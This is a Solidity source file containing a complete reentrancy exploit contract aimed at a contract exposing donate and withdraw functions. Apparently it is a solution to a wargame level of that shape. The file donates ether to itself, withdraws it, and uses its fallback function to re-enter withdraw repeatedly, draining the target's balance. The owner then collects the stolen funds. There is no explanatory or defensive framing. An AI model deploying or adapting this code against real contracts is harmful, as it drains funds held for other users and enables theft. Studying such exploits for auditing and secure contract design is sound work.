pragma solidity ^0.4.18;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyExploit {
    IReentrance public target;
    address public owner;
    uint public attackCount;

    constructor(address _targetAddress) public {
        target = IReentrance(_targetAddress);
        owner = msg.sender;
    }

    // Start the attack by donating and then withdrawing
    function beginAttack() external payable {
        require(msg.sender == owner);
        require(msg.value >= 1 ether);
        
        // Donate to self
        target.donate.value(1 ether)(address(this));

        // Trigger withdrawal
        target.withdraw(1 ether);
    }

    // Reentrancy triggered here
    function () public payable {
        if (address(target).balance >= 1 ether && attackCount < 5) {
            attackCount++;
            target.withdraw(1 ether);
        }
    }

    function withdrawProfits() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}

